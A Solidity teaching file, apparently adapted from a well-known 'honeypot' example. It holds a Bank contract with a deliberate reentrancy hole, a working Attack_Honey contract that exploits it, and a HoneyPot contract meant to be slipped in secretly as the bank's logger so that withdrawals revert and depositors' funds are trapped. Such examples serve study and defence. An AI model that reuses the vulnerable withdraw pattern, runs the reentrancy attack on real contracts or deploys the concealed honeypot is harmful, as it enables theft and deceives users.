// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;  
//pragma solidity >=0.7.0 <0.8.0;                            // Works up to < 0.8.0 
// Resources: https://solidity-by-example.org/hacks/honeypot/


// Logger & Bank contract's code will be uploaded through Etherscann, the important part is hidding Honeypot contract with the constructor of Bank contract
contract Logger {
    event Log(address caller, uint amount, string action);

    function log(address _caller, uint _amount, string memory _action) public {         
        emit Log(_caller, _amount, _action);
    }
}

contract Bank {
    mapping(address => uint) public balances;
    Logger logger;

    constructor(Logger _logger) {                                                       // We're gonna intialize Honeypot address instead of Logger address.
        logger = Logger(_logger);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
        logger.log(msg.sender, msg.value, "Deposit");
    }

    function withdraw(uint _amount) public {
        require(_amount <= balances[msg.sender], "Insufficient funds");

        (bool sent, ) = msg.sender.call{value: _amount}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] -= _amount;                                                // Open to a reentrancy attack

        logger.log(msg.sender, _amount, "Withdraw");
    }
}

// Let's say this code is in a separate file so that others cannot read it.
contract HoneyPot {
    function log(address _caller, uint _amount, string memory _action) public {
        if (equal(_action, "Withdraw")) {
            revert("It's a trap, reverting all your process! :)");      
        }
    }

    // Function to COMPARE strings using keccak256
    function equal(string memory _a, string memory _b) public pure returns (bool) {
        return keccak256(abi.encode(_a)) == keccak256(abi.encode(_b));
    }
}

// Hacker tries to drain the Ethers stored in Bank by reentrancy.
contract Attack_Honey {
    Bank bank;

    constructor(Bank _bank) {
        bank = Bank(_bank);
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(1 ether);
        }
    }

    function attack() public payable {
        bank.deposit{value: 1 ether}();
        bank.withdraw(1 ether);
    }

    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}

